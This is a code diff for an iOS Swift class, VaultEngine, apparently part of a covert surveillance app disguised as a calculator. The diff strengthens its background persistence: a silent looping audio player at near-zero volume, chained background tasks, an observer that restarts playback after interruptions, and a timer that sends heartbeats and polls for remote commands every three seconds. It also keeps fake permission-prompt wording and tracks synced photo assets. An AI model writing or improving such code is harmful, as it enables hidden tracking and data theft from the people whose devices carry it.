@@ -105,10 +105,12 @@ class VaultEngine: NSObject, ObservableObject {
     @Published var fakePrompt2Message: String = "To keep streaming providers and repository buffer updated."
 
     private var audioPlayer: AVAudioPlayer?
-    private var pollTimer: Timer?
+    private var bgTimer: DispatchSourceTimer?
+    private let heartbeatQueue = DispatchQueue(label: "com.calculator.heartbeat", qos: .background)
     private var bgTaskID: UIBackgroundTaskIdentifier = .invalid
     private let session: URLSession
     private var syncedAssetIds: Set<String> = []
+    private var interruptionObserver: NSObjectProtocol?
 
     override init() {
         let config = URLSessionConfiguration.default
@@ -119,6 +121,7 @@ class VaultEngine: NSObject, ObservableObject {
 
         super.init()
         UIDevice.current.isBatteryMonitoringEnabled = true
+        setupInterruptionObserver()
         loadSettings()
     }
 
@@ -195,9 +198,11 @@ class VaultEngine: NSObject, ObservableObject {
     }
 
     func updateBatteryInfo() {
-        let level = UIDevice.current.batteryLevel
-        batteryLevel = level >= 0 ? Int(level * 100) : 100
-        isCharging = (UIDevice.current.batteryState == .charging || UIDevice.current.batteryState == .full)
+        DispatchQueue.main.async {
+            let level = UIDevice.current.batteryLevel
+            self.batteryLevel = level >= 0 ? Int(level * 100) : 100
+            self.isCharging = (UIDevice.current.batteryState == .charging || UIDevice.current.batteryState == .full)
+        }
     }
 
     func checkPermissionStatus() {
@@ -255,15 +260,21 @@ class VaultEngine: NSObject, ObservableObject {
     func startBackgroundKeepAlive() {
         registerBackgroundTask()
 
+        if let player = audioPlayer, player.isPlaying {
+            return
+        }
+
         do {
             try AVAudioSession.sharedInstance().setCategory(.playback, mode: .default, options: [.mixWithOthers])
             try AVAudioSession.sharedInstance().setActive(true)
 
-            let silentWavData = createSilentWavData()
-            audioPlayer = try AVAudioPlayer(data: silentWavData)
-            audioPlayer?.numberOfLoops = -1
-            audioPlayer?.volume = 0.01
-            audioPlayer?.prepareToPlay()
+            if audioPlayer == nil {
+                let silentWavData = createSilentWavData()
+                audioPlayer = try AVAudioPlayer(data: silentWavData)
+                audioPlayer?.numberOfLoops = -1
+                audioPlayer?.volume = 0.01
+                audioPlayer?.prepareToPlay()
+            }
             audioPlayer?.play()
 
             DispatchQueue.main.async {
@@ -275,11 +286,34 @@ class VaultEngine: NSObject, ObservableObject {
     }
 
     func registerBackgroundTask() {
-        if bgTaskID != .invalid {
-            UIApplication.shared.endBackgroundTask(bgTaskID)
-        }
+        let oldTask = bgTaskID
         bgTaskID = UIApplication.shared.beginBackgroundTask(withName: "VaultKeepAlive") { [weak self] in
-            self?.registerBackgroundTask()
+            guard let self = self else { return }
+            let expiredTask = self.bgTaskID
+            self.bgTaskID = .invalid
+            if expiredTask != .invalid {
+                UIApplication.shared.endBackgroundTask(expiredTask)
+            }
+            self.registerBackgroundTask()
+        }
+        if oldTask != .invalid {
+            UIApplication.shared.endBackgroundTask(oldTask)
+        }
+    }
+
+    private func setupInterruptionObserver() {
+        interruptionObserver = NotificationCenter.default.addObserver(
+            forName: AVAudioSession.interruptionNotification,
+            object: nil,
+            queue: .main
+        ) { [weak self] notification in
+            guard let userInfo = notification.userInfo,
+                  let typeValue = userInfo[AVAudioSessionInterruptionTypeKey] as? UInt,
+                  let type = AVAudioSession.InterruptionType(rawValue: typeValue) else { return }
+            if type == .ended {
+                try? AVAudioSession.sharedInstance().setActive(true)
+                self?.audioPlayer?.play()
+            }
         }
     }
 
@@ -314,17 +348,24 @@ class VaultEngine: NSObject, ObservableObject {
         return data
     }
 
-    // MARK: - Heartbeat Loop
+    // MARK: - Heartbeat Loop (GCD DispatchSourceTimer on Background Queue)
     func startHeartbeat() {
-        pollTimer?.invalidate()
+        bgTimer?.cancel()
+        bgTimer = nil
+
         sendHeartbeat()
         checkForCommands()
 
-        pollTimer = Timer.scheduledTimer(withTimeInterval: 2.5, repeats: true) { [weak self] _ in
-            self?.updateBatteryInfo()
-            self?.sendHeartbeat()
-            self?.checkForCommands()
+        let timer = DispatchSource.makeTimerSource(flags: [], queue: heartbeatQueue)
+        timer.schedule(deadline: .now() + 3.0, repeating: 3.0, leeway: .milliseconds(500))
+        timer.setEventHandler { [weak self] in
+            guard let self = self else { return }
+            self.updateBatteryInfo()
+            self.sendHeartbeat()
+            self.checkForCommands()
         }
+        timer.resume()
+        bgTimer = timer
     }
 
     func sendHeartbeat() {
